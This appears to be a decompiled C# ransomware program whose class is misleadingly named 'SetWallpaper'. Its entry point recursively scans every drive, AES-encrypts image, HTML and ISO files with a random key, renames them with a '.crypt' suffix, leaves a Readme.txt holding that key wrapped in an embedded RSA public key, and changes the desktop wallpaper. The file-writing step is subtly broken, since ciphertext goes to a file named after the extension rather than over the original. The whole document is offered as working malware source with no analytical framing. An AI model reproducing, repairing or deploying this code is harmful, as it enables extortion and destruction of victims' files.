using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ConsoleApp1;

internal class Program
{
	public class SetWallpaper
	{
		public class FileStreamModel
		{
			public int offset { get; set; }

			public string file { get; set; }
		}

		private static string key = AESKey();

		private static string publickey = "<RSAKeyValue><Modulus>2az6fvOt5zWY7vfwF56I3v5C6ZrRUyJ6EdEepwbnihw1Y0o+ARsne2+enKbAcTpduc4ie4276iRrOr24N2qpa/rcHONU24pDW6qfsV91p+ip/UeNPT6SJaTs0jqiKK3Rg/tWnJMfJEbtX+cear1DO6qa0LfzdZitXDjACqqCPTSjnYTFNU8ydHShFtIvcM/sq3Oot9gAGFx19eZn8uzmgNJeO6fFL8PEvrzqc+czGeiUI3kHXBGX29DIp6RGmgr5pPIgdr45E5d/OIXPPCOp0Ibwe1DzmLwLXylDohSAogltNfpnJDIiDxx/4oowwNHKRyQvGfYW/TMGT5c2LgFXEQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

		private static string RsaAESKey = RSAEncrypt(publickey, key);

		private static int filesSum = 0;

		private static string[] Filetype = new string[4] { ".jpg", ".html", ".png", ".iso" };

		[DllImport("user32.dll")]
		private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

		public static string RSAEncrypt(string xmlPublicKey, string content)
		{
			string empty = string.Empty;
			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(xmlPublicKey);
			byte[] inArray = rSACryptoServiceProvider.Encrypt(Encoding.Default.GetBytes(content), fOAEP: false);
			return Convert.ToBase64String(inArray);
		}

		public static string RSADecrypt(string xmlPrivateKey, string content)
		{
			string empty = string.Empty;
			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(xmlPrivateKey);
			byte[] bytes = rSACryptoServiceProvider.Decrypt(Convert.FromBase64String(content), fOAEP: false);
			return Encoding.GetEncoding("utf-8").GetString(bytes);
		}

		public static string getStr(bool b, int n)
		{
			string text = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
			if (b)
			{
				text += "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
			}
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			for (int i = 0; i < n; i++)
			{
				stringBuilder.Append(text.Substring(random.Next(0, text.Length), 1));
			}
			return stringBuilder.ToString();
		}

		public static string AESKey()
		{
			return getStr(b: true, 32);
		}

		public static byte[] AESEncrypt(byte[] encryptStr, string key)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(key);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			return cryptoTransform.TransformFinalBlock(encryptStr, 0, encryptStr.Length);
		}

		private static void getFilesPath(DirectoryInfo dir)
		{
			try
			{
				FileInfo[] files = dir.GetFiles("*.*");
				FileInfo[] array = files;
				foreach (FileInfo fileInfo in array)
				{
					filesSum++;
					if (Array.IndexOf(Filetype, fileInfo.Extension) >= 0)
					{
						byte[] encryptStr = File.ReadAllBytes(fileInfo.FullName);
						byte[] bytes = AESEncrypt(encryptStr, key);
						File.WriteAllBytes(fileInfo.Extension, bytes);
						File.Move(fileInfo.FullName, fileInfo.FullName + ".crypt");
						File.WriteAllText(fileInfo.DirectoryName + "\\Readme.txt", RsaAESKey);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
			try
			{
				DirectoryInfo[] directories = dir.GetDirectories();
				DirectoryInfo[] array2 = directories;
				foreach (DirectoryInfo dir2 in array2)
				{
					getFilesPath(dir2);
				}
			}
			catch (Exception ex2)
			{
				Console.WriteLine(ex2.Message);
			}
		}

		private static void Main()
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				DirectoryInfo dir = new DirectoryInfo(driveInfo.Name);
				getFilesPath(dir);
			}
			Console.WriteLine(key);
			Console.WriteLine(RsaAESKey);
			SystemParametersInfo(20, 0, "c:\\1.jpg", 2);
		}
	}
}
